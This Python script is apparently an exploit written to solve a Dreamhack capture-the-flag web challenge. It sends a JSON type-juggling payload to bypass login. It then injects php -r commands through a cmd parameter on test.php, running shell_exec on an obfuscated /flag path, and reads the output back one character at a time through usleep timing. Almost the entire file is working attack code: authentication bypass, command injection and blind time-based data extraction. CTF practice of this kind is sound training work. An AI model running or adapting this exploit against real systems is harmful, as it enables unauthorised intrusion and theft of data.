import requests
import json
import time
import string

class Exploit:
    def __init__(self, baseURL):
        self.baseURL = baseURL.rstrip("/")
        self.session = requests.Session()
        self.charset = string.ascii_lowercase + string.ascii_uppercase + string.ascii_letters+ string.digits + "{._-}\n"
        self.sleep = 1.2          
        self.threshold = 0.9        
        self.max_len = 100          
        self.stop_char = "}"       

    def login(self):
        r = self.session.post(
            f"{self.baseURL}/index.php",
            data={"username": json.dumps({"username": True})},
            allow_redirects=True,
            timeout=10,
        )
        print("[+] Login sent. HTTP", r.status_code)
        return r.status_code in (200, 302)

    def probe_cli(self):
        time_based = 800_000  
        start = time.time()
        self.session.get(
            f"{self.baseURL}/test.php",
            params={"cmd": f"php -r usleep({time_based});"},
            timeout=15,
        )
        endTime = time.time() - start
        self.threshold = max(0.6, endTime * 0.8)
        print(f"[i] Trigger php -r usleep({time_based}) -> {endTime:.3f}s | threshold={self.threshold:.3f}s")
        return endTime

    def brute_force_flag(self):
        flag = ""
        sleep_us = int(self.sleep * 1_000_000)

        for i in range(self.max_len):
            found = False
            for ch in self.charset:
                asc = ord(ch)
                php_code = (
                    "$p=chr(47).chr(102).chr(108).chr(97).chr(103);"
                    "$o=shell_exec($p);"
                    f"if(strlen($o)>{i}&&ord($o[{i}])=={asc})usleep({sleep_us});"
                )

                start = time.time()
                self.session.get(
                    f"{self.baseURL}/test.php",
                    params={"cmd": f"php -r {php_code}"},
                    timeout=20,
                )
                dt = time.time() - start

                if dt > self.threshold:
                    flag += ch
                    print(f"[{i}] -> {ch}  ({dt:.3f}s)   {flag}")
                    found = True
                    break

            if not found:
                print(f"[{i}] -> DONE FLAG: {flag}")
                break
            if flag.endswith(self.stop_char):
                print("[!] Reached stop char '}'")
                break

        return flag

if __name__ == "__main__":
    BASE_URL = "http://host8.dreamhack.games:18657"
    x = Exploit(BASE_URL)
    if not x.login():
        raise SystemExit("[-] Login failed")
    x.probe_cli()
    result = x.brute_force_flag()
    print("\n[RESULT] flag:", result)
